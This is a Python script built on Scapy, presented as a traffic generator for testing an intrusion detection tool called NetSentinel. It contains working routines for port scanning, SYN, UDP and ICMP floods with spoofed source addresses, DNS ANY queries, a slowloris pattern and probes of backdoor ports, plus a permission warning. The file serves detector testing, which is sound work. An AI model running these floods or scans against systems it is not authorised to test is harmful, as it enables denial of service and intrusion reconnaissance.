#!/usr/bin/env python3
"""
Traffic Generator - Simulate various network attacks for testing NetSentinel
"""

from scapy.all import *
import random
import time
import argparse

class TrafficGenerator:
    """Generate various types of network traffic for testing"""
    
    def __init__(self, target_ip, interface='eth0'):
        self.target_ip = target_ip
        self.interface = interface
        self.source_ip = self.get_random_ip()
        
    def get_random_ip(self):
        """Generate random source IP"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def normal_traffic(self, duration=10):
        """Generate normal-looking traffic"""
        print(f"Generating normal traffic for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            # Random HTTP request
            dst_port = random.choice([80, 443, 8080])
            src_port = random.randint(1024, 65535)
            
            packet = IP(src=self.source_ip, dst=self.target_ip)/\
                    TCP(sport=src_port, dport=dst_port, flags='S')
            
            send(packet, verbose=0, iface=self.interface)
            time.sleep(random.uniform(0.1, 0.5))
    
    def port_scan(self, port_range=(1, 1024)):
        """Simulate port scanning attack"""
        print(f"Simulating port scan on {self.target_ip}...")
        
        for port in range(port_range[0], port_range[1]):
            packet = IP(src=self.source_ip, dst=self.target_ip)/\
                    TCP(sport=random.randint(1024, 65535), dport=port, flags='S')
            
            send(packet, verbose=0, iface=self.interface)
            time.sleep(0.01)  # Small delay to avoid overwhelming
        
        print(f"Port scan complete: {port_range[1] - port_range[0]} ports scanned")
    
    def syn_flood(self, duration=10, rate=100):
        """Simulate SYN flood attack"""
        print(f"Simulating SYN flood for {duration} seconds at {rate} packets/sec...")
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            # Random source IP for each packet (IP spoofing simulation)
            src_ip = self.get_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443, 22, 21])
            
            packet = IP(src=src_ip, dst=self.target_ip)/\
                    TCP(sport=src_port, dport=dst_port, flags='S')
            
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            
            time.sleep(1.0 / rate)
        
        print(f"SYN flood complete: {packet_count} packets sent")
    
    def udp_flood(self, duration=10, rate=100):
        """Simulate UDP flood attack"""
        print(f"Simulating UDP flood for {duration} seconds at {rate} packets/sec...")
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            src_ip = self.get_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = random.randint(1, 65535)
            
            payload = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=100))
            
            packet = IP(src=src_ip, dst=self.target_ip)/\
                    UDP(sport=src_port, dport=dst_port)/\
                    Raw(load=payload)
            
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            
            time.sleep(1.0 / rate)
        
        print(f"UDP flood complete: {packet_count} packets sent")
    
    def icmp_flood(self, duration=10, rate=50):
        """Simulate ICMP flood (ping flood)"""
        print(f"Simulating ICMP flood for {duration} seconds at {rate} packets/sec...")
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            src_ip = self.get_random_ip()
            
            packet = IP(src=src_ip, dst=self.target_ip)/\
                    ICMP(type=8, code=0)/\
                    Raw(load='X' * 56)
            
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            
            time.sleep(1.0 / rate)
        
        print(f"ICMP flood complete: {packet_count} packets sent")
    
    def suspicious_port_access(self):
        """Access commonly blocked/suspicious ports"""
        print("Attempting connections to suspicious ports...")
        
        suspicious_ports = [31337, 12345, 6667, 1337, 27374, 
                          4444, 5555, 7777, 8888, 9999]
        
        for port in suspicious_ports:
            packet = IP(src=self.source_ip, dst=self.target_ip)/\
                    TCP(sport=random.randint(1024, 65535), dport=port, flags='S')
            
            send(packet, verbose=0, iface=self.interface)
            time.sleep(0.1)
        
        print(f"Suspicious port access complete: {len(suspicious_ports)} ports")
    
    def dns_amplification(self, duration=5):
        """Simulate DNS amplification attack pattern"""
        print(f"Simulating DNS amplification for {duration} seconds...")
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            src_ip = self.get_random_ip()
            
            # Large DNS query
            dns_query = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
            
            packet = IP(src=src_ip, dst=self.target_ip)/\
                    UDP(sport=random.randint(1024, 65535), dport=53)/\
                    dns_query
            
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            
            time.sleep(0.2)
        
        print(f"DNS amplification complete: {packet_count} queries sent")
    
    def slowloris(self, duration=10):
        """Simulate slowloris attack pattern"""
        print(f"Simulating slowloris attack for {duration} seconds...")
        start_time = time.time()
        connections = []
        
        # Open multiple connections
        for i in range(20):
            src_port = 1024 + i
            packet = IP(src=self.source_ip, dst=self.target_ip)/\
                    TCP(sport=src_port, dport=80, flags='S')
            send(packet, verbose=0, iface=self.interface)
            connections.append(src_port)
            time.sleep(0.1)
        
        # Keep connections alive with minimal traffic
        while time.time() - start_time < duration:
            for src_port in connections:
                packet = IP(src=self.source_ip, dst=self.target_ip)/\
                        TCP(sport=src_port, dport=80, flags='A')/\
                        Raw(load='X-a: b\r\n')
                send(packet, verbose=0, iface=self.interface)
            
            time.sleep(2)
        
        print("Slowloris simulation complete")
    
    def mixed_attack(self, duration=30):
        """Simulate a mixed attack scenario"""
        print(f"Starting mixed attack scenario for {duration} seconds...")
        
        attack_types = [
            ('port_scan', lambda: self.port_scan((1, 100))),
            ('syn_flood', lambda: self.syn_flood(5, 50)),
            ('udp_flood', lambda: self.udp_flood(5, 50)),
            ('icmp_flood', lambda: self.icmp_flood(5, 30)),
            ('suspicious_ports', self.suspicious_port_access),
        ]
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            attack_name, attack_func = random.choice(attack_types)
            print(f"  Executing: {attack_name}")
            attack_func()
            time.sleep(2)
        
        print("Mixed attack scenario complete")


def main():
    parser = argparse.ArgumentParser(description='NetSentinel Traffic Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-i', '--interface', default='eth0', help='Network interface')
    parser.add_argument('-a', '--attack', 
                       choices=['normal', 'port_scan', 'syn_flood', 'udp_flood', 
                               'icmp_flood', 'suspicious_ports', 'dns_amp', 
                               'slowloris', 'mixed'],
                       default='normal',
                       help='Type of traffic to generate')
    parser.add_argument('-d', '--duration', type=int, default=10,
                       help='Duration in seconds')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("NetSentinel Traffic Generator")
    print("=" * 60)
    print(f"Target: {args.target}")
    print(f"Interface: {args.interface}")
    print(f"Attack Type: {args.attack}")
    print("=" * 60)
    print("\nWARNING: Only use this tool on networks you own or have permission to test!")
    print("Press Ctrl+C to stop\n")
    
    time.sleep(2)
    
    generator = TrafficGenerator(args.target, args.interface)
    
    try:
        if args.attack == 'normal':
            generator.normal_traffic(args.duration)
        elif args.attack == 'port_scan':
            generator.port_scan()
        elif args.attack == 'syn_flood':
            generator.syn_flood(args.duration)
        elif args.attack == 'udp_flood':
            generator.udp_flood(args.duration)
        elif args.attack == 'icmp_flood':
            generator.icmp_flood(args.duration)
        elif args.attack == 'suspicious_ports':
            generator.suspicious_port_access()
        elif args.attack == 'dns_amp':
            generator.dns_amplification(args.duration)
        elif args.attack == 'slowloris':
            generator.slowloris(args.duration)
        elif args.attack == 'mixed':
            generator.mixed_attack(args.duration)
            
    except KeyboardInterrupt:
        print("\n\nTraffic generation stopped by user")
    except Exception as e:
        print(f"\nError: {e}")
        print("Note: You may need to run with sudo/administrator privileges")


if __name__ == '__main__':
    main()
